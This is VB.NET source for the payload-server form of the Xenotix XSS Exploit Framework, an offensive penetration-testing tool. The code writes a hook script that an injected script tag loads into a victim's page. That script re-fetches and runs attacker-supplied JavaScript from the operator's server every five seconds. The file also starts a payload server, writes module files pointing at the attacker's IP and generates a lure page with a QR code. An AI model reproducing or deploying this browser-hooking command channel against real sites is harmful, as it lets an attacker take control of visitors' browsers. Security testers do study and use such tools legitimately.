Imports System.IO
Imports System.Net
Imports System.Net.Sockets
Imports System.Reflection
Imports System.Text
Imports System.Threading
Imports System.Net.NetworkInformation

Public Class xss_server
    Public xip, xport As String
    Public payload_server_ip As String
    Public server_ip As String
    Public prt As String
    Public q As String = """"

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        Dim jnk As Integer
        If ip.Text = "" Or Not Int32.TryParse(port.Text, jnk) Or port.Text = "" Or jnk < 1 Or jnk > 65355 Then
            MsgBox("Enter a valid IP Address and Port Number", vbCritical)
        ElseIf port.Text = 3555 Then
            MsgBox("Port 3555 is a reserved port for Xenotix XSS Exploit Framework", vbCritical)
        Else
            My.Settings.xen_server_ip = ip.Text
            My.Settings.xen_server_port = port.Text
            My.Settings.Save()



            If port.Text = "80" Then
                prt = ""
            Else
                prt = ":" & port.Text
            End If

            TextBox5.Text = "<script src=" & q & "http://" & ip.Text & prt & "/xook.js" & q & "></script>"
            Dim cmp As String
            cmp = " /Bind=" & q & "0.0.0.0" & q & " /Port=" & port.Text & " /Root=" & q & "./" & q & " /Start /Minimized"
            Try

                Process.Start("QuickPHP.exe", cmp)
                Me.Height = 165
                server_ip = ip.Text & prt
                Button1.Enabled = False
                Button3.Enabled = True
                xenotix_main.config_set = 1
                Dim stream As New IO.StreamWriter(Application.StartupPath & "\xook.js")
                If CheckBox1.Checked = True Then
                    stream.WriteLine(TextBox6.Text)
                    stream.WriteLine("function js_reload(){if (document.getElementById('xenotix_xss') != null)document.body.removeChild(document.getElementById('xenotix_xss')); ")
                    stream.WriteLine("script = document.createElement('script');script.id = 'xenotix_xss';script.src ='http://" & server_ip & "/xss.js'; ")
                    stream.Write("document.body.appendChild(script);}if (typeof(init) != 'undefined')clearInterval(init);init = setInterval(js_reload, 5000); js_reload()")
                    stream.Close()
                Else

                    stream.WriteLine("function js_reload(){if (document.getElementById('xenotix_xss') != null)document.body.removeChild(document.getElementById('xenotix_xss')); ")
                    stream.WriteLine("script = document.createElement('script');script.id = 'xenotix_xss';script.src ='http://" & server_ip & "/xss.js'; ")
                    stream.Write("document.body.appendChild(script);}if (typeof(init) != 'undefined')clearInterval(init);init = setInterval(js_reload, 5000); js_reload()")
                    stream.Close()
                End If
                payload_server_ip = ip.Text
                xip = ip.Text
                xport = port.Text
                startserver()
                Dim x As String
                x = xenotix_main.RichTextBox1.Text.Replace("XXXxenotixXXX", payload_server_ip)
                xenotix_main.RichTextBox1.Text = x
                System.IO.File.WriteAllText(Application.StartupPath & "\\scripting_engine\\Modules\\payload.dat", x, Encoding.UTF8)
                System.IO.File.WriteAllText(Application.StartupPath & "\\scripting_engine\\Modules\\ext.dat", "http://" & payload_server_ip & ":3555/xss_serve_payloads/kcf.js")
                System.IO.File.WriteAllText("xook.html", "<html><head>.<script src=" & q & "http://" & ip.Text & prt & "/xook.js" & q & "></script></head><body> </body></html>")
                Button4.Enabled = True
                LinkLabel1.Text = "http://" & ip.Text & prt & "/xook.html"
                xenotix_main.server_stat.Text = "Server: Running at " & ip.Text & prt
            Catch ee As Exception

                MsgBox(ee.Message.ToString(), vbCritical)
            End Try
        End If


    End Sub

    Dim avail_ips As String = ""
    Private Sub xss_server_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        On Error Resume Next
        System.IO.File.Delete(Application.StartupPath & "\\scripting_engine\\Modules\\ext.dat")
        System.IO.File.Delete(Application.StartupPath & "\\scripting_engine\\Modules\\payload.dat")
        'GET IPS

        Dim Interfaces As NetworkInterface() = NetworkInterface.GetAllNetworkInterfaces()
        Dim adapter As NetworkInterface
        For Each adapter In Interfaces
            If adapter.NetworkInterfaceType = NetworkInterfaceType.Loopback Then
                Continue For
            End If
            avail_ips += "Adapter : " & adapter.Name & Environment.NewLine
            Dim IPInfo As UnicastIPAddressInformationCollection = adapter.GetIPProperties().UnicastAddresses
            For Each IPAddressInfo As UnicastIPAddressInformation In IPInfo
                avail_ips += "IP Address : " & IPAddressInfo.Address.ToString & Environment.NewLine
            Next

        Next

        Button3.Enabled = False
        Button4.Enabled = False
        ip.Text = My.Settings.xen_server_ip
        port.Text = My.Settings.xen_server_port
        Shell("taskkill /F /IM QuickPHP.exe")
    End Sub

    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs)
        On Error Resume Next
        Shell("taskkill /F /IM QuickPHP.exe")
        xenotix_main.config_set = 0
        IO.File.Delete("xook.js")
        exits()
        Dim x As String
        x = xenotix_main.RichTextBox1.Text.Replace(payload_server_ip, "XXXxenotixXXX")
        xenotix_main.RichTextBox1.Text = x
        Me.Height = 92
        Button1.Enabled = True

    End Sub

    Private Sub GroupBox2_Enter(ByVal sender As System.Object, ByVal e As System.EventArgs)

    End Sub

    Private Sub Button3_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button3.Click

        On Error Resume Next

        Shell("taskkill /F /IM QuickPHP.exe")
        xenotix_main.config_set = 0
        IO.File.Delete("xook.js")
        System.IO.File.Delete(Application.StartupPath & "\\scripting_engine\\Modules\\ext.dat")
        System.IO.File.Delete(Application.StartupPath & "\\scripting_engine\\Modules\\payload.dat")
        xenotix_main.server_stat.Text = "Server: Not Running"
        exits()
        Dim x As String
        x = xenotix_main.RichTextBox1.Text.Replace(payload_server_ip, "XXXxenotixXXX")
        xenotix_main.RichTextBox1.Text = x
        Me.Close()
    End Sub

    Private Sub port_TextChanged(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles port.TextChanged

    End Sub
    'HTTP SERVER 
    '#Region "Server Functions"
    Private myListener As TcpListener
    Shared sDocRoot As String
    Shared sport As Integer

    Dim th As New Thread(New ThreadStart(AddressOf StartListen))
    'The constructor which make the TcpListener start listening on the given port.
    'It also calls a Thread on the method StartListen(). 
    Public Sub startserver()
        Try
            sDocRoot = Application.StartupPath
            sport = 3555
            'start listing on the given port
            myListener = New TcpListener(IPAddress.Any, sport)
            myListener.Start()
            'start the thread which calls the method 'StartListen'

            th.Start()
        Catch e As System.Net.Sockets.SocketException
            If e.Message = "Only one usage of each socket address (protocol/network address/port) is normally permitted" Then
                MsgBox("Port already Binded", vbCritical)
            End If
        Catch e As Exception
            MsgBox(e.Message.ToString, vbCritical)

        End Try

    End Sub
    Public Sub exits()

        myListener.Stop()
        th.Abort()


    End Sub


    'This method Accepts the new connection.
    'First it receives the welcome message from the client,
    'Then it sends the Current date time to the Client.
    Public Sub StartListen()
        Try
            Dim iStartPos As Integer = 0
            Dim sRequest As String = ""
            Dim sDirName As String = ""
            Dim sRequestedFile As String = ""
            Dim sErrorMessage As String = ""
            Dim sFolderName As String = ""
            Dim sLocalDir As String = ""
            Dim sPhysicalFilePath As String = ""
            Dim sFormattedMessage As String = ""
            Dim sResponse As String = ""

            While True
                'Accept a new connection
                Dim mySocket As Socket = myListener.AcceptSocket()
                If mySocket.Connected Then
                    'make a byte array and receive data from the client 
                    Dim bReceive As Byte() = New Byte(1023) {}
                    Dim i As Integer = mySocket.Receive(bReceive, bReceive.Length, 0)

                    'Convert Byte to String
                    Dim sBuffer As String = Encoding.ASCII.GetString(bReceive)
                    If sBuffer = "" Then
                        mySocket.Close()
                        Exit Sub
                    End If
                    'At present we will only deal with GET type

                    ' Look for HTTP request
                    iStartPos = sBuffer.IndexOf("HTTP", 1)

                    ' Get the HTTP text and version e.g. it will return "HTTP/1.1"
                    Dim sHttpVersion As String = sBuffer.Substring(iStartPos, 8)

                    ' Extract the Requested Type and Requested file/directory
                    sRequest = sBuffer.Substring(0, iStartPos - 1)

                    'Replace backslash with Forward Slash, if Any
                    sRequest.Replace("\", "/")

                    'If file name is not supplied add forward slash to indicate 
                    'that it is a directory and then we will look for the 
                    'default file name..
                    If (sRequest.IndexOf(".") < 1) AndAlso (Not sRequest.EndsWith("/")) Then
                        sRequest = sRequest & "/"
                    End If

                    'Extract the requested file name
                    iStartPos = sRequest.LastIndexOf("/") + 1
                    sRequestedFile = sRequest.Substring(iStartPos)

                    'Extract The directory Name
                    sDirName = sRequest.Substring(sRequest.IndexOf("/"), sRequest.LastIndexOf("/") - 3)
                    If sDirName = "" Then
                        ' Identify the Physical Directory
                        sLocalDir = sDocRoot
                    Else
                        Dim temp As String = sDirName.Replace("/", "\")
                        sLocalDir = Application.StartupPath & temp

                    End If
                    'If the physical directory does not exist then dispaly the error message
                    If Not Directory.Exists(sLocalDir) Then
                        sErrorMessage = "<H2>Error!! Requested Directory does not exist!</H2><Br>"
                        'Format The Message
                        SendHeader(sHttpVersion, "", sErrorMessage.Length, " 404 Not Found", mySocket)

                        'Send to the browser
                        SendToBrowser(sErrorMessage, mySocket)

                        mySocket.Close()
                        Continue While
                    End If


                    ' Identify the File Name


                    'If The file name is not supplied then look in the default file list
                    If sRequestedFile.Length = 0 Then
                        ' Get the default filename
                        If sRequestedFile = "" Then
                            sErrorMessage = "<H2>Xenotix Payload Server: 404 File Not Found</H2>"
                            SendHeader(sHttpVersion, "", sErrorMessage.Length, " 404 Not Found", mySocket)
                            SendToBrowser(sErrorMessage, mySocket)
                            mySocket.Close()
                            Continue While
                        End If
                    End If
                    ' Get TheMime Type
                    Dim sMimeType As String = getContentType(sRequestedFile)
                    'Build the physical path
                    sPhysicalFilePath = sLocalDir & "\" & sRequestedFile
                    If File.Exists(sPhysicalFilePath) = False Then

                        sErrorMessage = "<H2>Xenotix Payload Server: 404 File Not Found</H2>"
                        SendHeader(sHttpVersion, "", sErrorMessage.Length, " 404 Not Found", mySocket)
                        SendToBrowser(sErrorMessage, mySocket)
                    Else
                        Dim iTotBytes As Integer = 0
                        sResponse = ""

                        Dim fs As New FileStream(sPhysicalFilePath, FileMode.Open, FileAccess.Read, FileShare.Read)
                        ' Create a reader that can read bytes from the FileStream.
                        Dim reader As New BinaryReader(fs)
                        Dim bytes As Byte() = New Byte(fs.Length - 1) {}
                        Dim read As Integer
                        While (InlineAssignHelper(read, reader.Read(bytes, 0, bytes.Length))) <> 0
                            ' Read from the file and write the data to the network
                            sResponse = sResponse & Encoding.ASCII.GetString(bytes, 0, read)
                            iTotBytes = iTotBytes + read
                        End While
                        reader.Close()

                        SendHeader(sHttpVersion, sMimeType, iTotBytes, " 200 OK", mySocket)
                        SendToBrowser(bytes, mySocket)
                    End If
                    mySocket.Close()

                End If
            End While
        Catch e As Exception

        End Try
    End Sub

    'GETS

    Private Function getContentType(ByVal httpRequest As String) As String
        If (httpRequest.EndsWith(".html")) Then
            Return "text/html"
        ElseIf (httpRequest.EndsWith(".png")) Then
            Return "image/png"
        ElseIf (httpRequest.EndsWith(".htm")) Then
            Return "text/html"
        ElseIf (httpRequest.EndsWith(".txt")) Then
            Return "text/plain"
        ElseIf (httpRequest.EndsWith(".gif")) Then
            Return "image/gif"
        ElseIf (httpRequest.EndsWith(".jpg")) Then
            Return "image/jpeg"
        ElseIf (httpRequest.EndsWith(".jpeg")) Then
            Return "image/jpeg"
        ElseIf (httpRequest.EndsWith(".swf")) Then
            Return "application/x-shockwave-flash"
            ' ADD BMP,js,xml
        ElseIf (httpRequest.EndsWith(".bmp")) Then
            Return "image/bmp"
        ElseIf (httpRequest.EndsWith(".js")) Then
            Return "application/javascript"
        ElseIf (httpRequest.EndsWith(".xml")) Then
            Return "application/xml"
        ElseIf (httpRequest.EndsWith(".xpi")) Then
            Return "application/x-xpinstall"
        Else
            Return "application/octect"
        End If
    End Function

    'SENDS


    Public Sub SendHeader(ByVal sHttpVersion As String, ByVal sMIMEHeader As String, ByVal iTotBytes As Integer, ByVal sStatusCode As String, ByRef mySocket As Socket)

        Dim sBuffer As String = ""

        ' if Mime type is not provided set default to text/html
        If sMIMEHeader.Length = 0 Then
            ' Default Mime Type is text/html
            sMIMEHeader = "text/html"
        End If

        sBuffer = sBuffer & sHttpVersion & sStatusCode & vbCr & vbLf
        sBuffer = sBuffer & "Server: Xenotix Payload Server" & vbCr & vbLf
        sBuffer = sBuffer & "Content-Type: " & sMIMEHeader & vbCr & vbLf
        sBuffer = sBuffer & "Accept-Ranges: bytes" & vbCr & vbLf
        sBuffer = sBuffer & "Content-Length: " & iTotBytes & vbCr & vbLf & vbCr & vbLf

        Dim bSendData As Byte() = Encoding.ASCII.GetBytes(sBuffer)

        SendToBrowser(bSendData, mySocket)

    End Sub

    Public Sub SendToBrowser(ByVal sData As String, ByRef mySocket As Socket)
        SendToBrowser(Encoding.ASCII.GetBytes(sData), mySocket)
    End Sub

    Public Sub SendToBrowser(ByVal bSendData As Byte(), ByRef mySocket As Socket)
        Dim numBytes As Integer = 0

        Try
            If mySocket.Connected Then
                If (InlineAssignHelper(numBytes, mySocket.Send(bSendData, bSendData.Length, 0))) = -1 Then
                End If
            Else

            End If
        Catch e As Exception
            MsgBox(e.Message.ToString)

        End Try
    End Sub

    Private Shared Function InlineAssignHelper(Of T)(ByRef target As T, ByVal value As T) As T
        target = value
        Return value
    End Function

    Private Sub Button2_Click_1(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        Me.Hide()
    End Sub

    Private Sub Button4_Click(sender As Object, e As EventArgs) Handles Button4.Click

        Me.Height = "486"
        Dim qr = "http://chart.apis.google.com/chart?cht=qr&chs=300x300&chl=http://" & ip.Text & prt & "/xook.html"
        WebBrowser1.Navigate(qr)

    End Sub

    Private Sub LinkLabel1_Click(sender As Object, e As EventArgs) Handles LinkLabel1.Click
        System.Diagnostics.Process.Start(LinkLabel1.Text)
    End Sub

    Private Sub ip_MouseHover(sender As Object, e As EventArgs) Handles ip.MouseHover
        Dim toolTip1 As New ToolTip()

        toolTip1.AutoPopDelay = 6000
        toolTip1.InitialDelay = 500
        toolTip1.ReshowDelay = 500
        toolTip1.ShowAlways = True
        toolTip1.SetToolTip(Me.ip, avail_ips)
    End Sub




    Private Sub ip_TextChanged(sender As Object, e As EventArgs) Handles ip.TextChanged

    End Sub
End Class




